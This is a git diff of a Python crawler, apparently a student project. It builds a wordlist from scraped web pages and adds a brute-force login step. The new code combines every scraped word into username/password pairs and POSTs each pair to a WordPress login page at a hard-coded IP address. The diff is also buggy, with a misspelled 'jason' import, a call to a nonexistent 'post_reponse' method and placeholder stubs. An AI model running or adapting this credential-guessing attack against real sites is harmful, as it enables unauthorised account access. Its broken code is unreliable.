@@ -1,4 +1,3 @@
-<<<<<<< HEAD
 import socket
 import sys
 import argparse
@@ -9,6 +8,8 @@ from bs4 import BeautifulSoup
 from bs4.element import Comment
 from urllib.parse import urljoin
 import base64
+import jason
+import requests
 #import httplib
 
 
@@ -34,8 +35,7 @@ try:
 except socket.error, exc:
     print "Caught exception socket.error : %s" % exc
 '''
-=======
->>>>>>> 258de193357a3d7e419dddbd41c7371e7022e50f
+
 class OneSocket:
     global user_agent
     def __init__(self):
@@ -83,61 +83,9 @@ class OneSocket:
             f.write(content)
             f.close()
 
-    # def post_request(self, url,userName,password):
-    #     url = urlparse(url)
-    #     host = url.hostname
-    #     port = url.port
-    #     phose = 'proxy_host'
-    #     if port is None:
-    #         port = 80
 
-
-    #     addr = socket.getaddrinfo(host, 80)[0][-1]
-    #     self.sock.connect(addr)
-    #     return (host, path)
-    #     if(user_agent):
-    #         user_pass = base64.encodingstring(userName+":"+password)
-    #         proxy_authorization = 'Proxy-authorization: Basic '+user_pass+'\r\n'
-    #         post_msg ='Post /%s HTTP/1.0\r\nHost: %s\r\nProxy-authorization: Basic %s:%s\r\nUser-agent: %s\r\n\r\n' % (temp[1], temp[0],userName,password,user_agent)
-    #         sent = self.sock.sendall(bytes(post_msg, 'utf8'))
-
-    # def get_post(self, url):
-    #     tmp=self.connect(url)
-    #     if(user_agent):
-    #         post_msg ='Post /%s HTTP/1.0\r\nHost: %s\r\nuserName=%s&password=%s\r\nUser-agent: %s\r\n\r\n' % (tmp[1],tmp[0],userName,password,user_agent)
-    #         sent = self.sock.sendall(bytes(post_msg), 'utf8')
-    #         if sent == 0:
-    #             raise RuntimeError("socket connection broken")
-    #     ############################## Get Response  ####################################
-    #     response=[]
-
-    #     while True:
-    #         data = self.sock.recv(4096)
-    #         if data:
-    #             response.append(data)
-    #         else:
-    #             break
-    #     self.sock.close()
-
-    #     response = b''.join(response)
-    #     all_content = response.decode("utf8", "ignore")
-
-    #     header = all_content.split('\r\n\r\n')[0]
-    #     with open("header_post.txt", "w") as f:
-    #         f.write(header)
-    #         f.close()
-
-    #     content = all_content.split('\r\n\r\n')[1]
-    #     content = content.encode()
-    #     with open("login.txt", 'wb') as f:
-    #         f.write(content)
-    #         f.close()
-
-'''
-##############################################################
-   Create 'wordsList'
 ###############################################################
-'''
+
 def capitalization_permutations(s):
     """Generates the different ways of capitalizing the letters in
     the string s."""
@@ -243,12 +191,16 @@ class Crawler:
             self.sock.get_response(url, filename)
 
     ############################################## Http--Post #########################
-    # def http_post(self,url,userName, password):
-    #     print("Post")
-    #     global user_agent
-    #     if user_agent:
-    #         self.sock=OneSocket()
-    #         self.sock.post_request(url,userName,password)
+    def http_post(self, url, data):
+        if user_agent:
+            sock=OneSocket()
+            self.sock.post_reponse(url, data)
+
+
+    ############################################## Links List #########################
+    def dfs(self, links_list):
+        print("here")
+
 
 
 ##############################################################################################
@@ -484,7 +436,8 @@ def main():
 
     #Doing BFS
     index=0
-    while(own_config['page']==0 or page_opened<own_config['page'] or index<len(subdomains)):
+    #own_config['page']==0 or page_opened<own_config['page'] or index<len(subdomains)
+    while(index<3):
         
         crawler.http_get(replace_subdomain(starting_page,subdomains[index]), 'sd.html')
         print("Tried "+replace_subdomain(starting_page,subdomains[index]))
@@ -505,6 +458,8 @@ def main():
 
         #replace the old starting url 
         starting_page=replace_subdomain(starting_page,subdomains[index])
+        #clean the tree
+        sd_links_depth.clear()
         ### start node of a new tree
         sd_links_depth[0]= [starting_page] 
 
@@ -514,40 +469,95 @@ def main():
         find_words(soup,words)
         find_sdlinks(soup,sd_links_depth,1,logins,crawler) 
 
-        current_depth=1
+        #Depth First Search
+        if own_config['choice'] == 'depth':
+            print("HI")
+        
+        # Breadth First Search
+        else:
+            current_depth=1
 
-        while(True):
-            if own_config['depth']!=0 and current_depth==own_config['depth']:
-                break  
-            if current_depth in sd_links_depth:
-                for each_link in sd_links_depth[current_depth]:
-                    crawler.http_get(each_link, 'home.html')
+            while(True):
+                if own_config['depth']!=0 and current_depth==own_config['depth']:
+                    break  
+                if current_depth in sd_links_depth:
+                    for each_link in sd_links_depth[current_depth]:
+                        crawler.http_get(each_link, 'home.html')
 
-                    #check deadend
-                    header = open("header.txt", encoding='utf8')
-                    firstline=header.readline().rstrip()
-                    error=0
-                    for codes in error_codes: 
-                        error_message="HTTP/1.1 "+codes
-                        if firstline==error_message:
-                            error=1
-                    if error==1:
-                        continue        
+                        #check deadend
+                        header = open("header.txt", encoding='utf8')
+                        firstline=header.readline().rstrip()
+                        error=0
+                        for codes in error_codes: 
+                            error_message="HTTP/1.1 "+codes
+                            if firstline==error_message:
+                                error=1
+                        if error==1:
+                            continue        
 
-                    page_opened+=1
-                    web = open("home.html", encoding='utf8')
-                    soup = BeautifulSoup(web, "html.parser")
-                    
-                    find_words(soup,words)
-                    find_sdlinks(soup,sd_links_depth,current_depth+1,logins,crawler) 
+                        page_opened+=1
+                        web = open("home.html", encoding='utf8')
+                        soup = BeautifulSoup(web, "html.parser")
+                        
+                        find_words(soup,words)
+                        find_sdlinks(soup,sd_links_depth,current_depth+1,logins,crawler) 
 
+                        if page_opened==own_config['page']:
+                            break
                     if page_opened==own_config['page']:
-                        break
-                if page_opened==own_config['page']:
-                    break 
-                current_depth+=1      
-            else:
-                break           
+                        break 
+                    current_depth+=1      
+                else:
+                    break           
 
     output_files(words,links_depth,sd_links_depth,logins)
-main()
+    crawler.http_get("http://3.16.240.57/wp-login.php", 'home_login.html')
+    
+
+    with open("home_login.html", encoding= 'utf8') as f:
+        soup2 = BeautifulSoup(f,"html.parser")
+        allForm = soup2.findAll('form')
+        user= None
+        pwd = None
+        for ele in allForm:
+            t = ele.find('input').get('id')
+            pwd = ele.find('input', type="password").get('name')
+            if "log" in t:
+                user = ele.find('input').get('name')
+
+        combine_file = open("results.txt", 'r')
+        l = []
+        with open("results.txt", mode="r") as file_1:
+            for line in file_1:
+                log_1, pwd_1 = line.split(',')
+                login_data = dict()
+                login_data = {
+                    user:log_1,
+                    pwd: pwd_1.strip(),
+                }
+                l.append(login_data)
+            file_1.close()
+    
+        for login_data in l:
+            crawler.http_post("http://3.16.240.57/wp-login.php", login_data)
+                        
+
+
+combine_file = open("results.txt", 'w')
+combined_list = []
+
+with open("words_1.txt", mode="r") as f:
+    for line in f:
+        combined_list.append(line.strip())
+    f.close()
+    for i in range(0, len(combined_list)):
+        for j in range(0, len(combined_list)):
+            log = combined_list[i]
+            pwd = combined_list[j]
+            obj = log + "," +pwd
+            combine_file.write(obj)
+            combine_file.write('\n')
+combine_file.close()
+# main()
+crawler = Crawler()
+crawler.http_get("http://3.16.240.57/wp-login.php", "login.html")
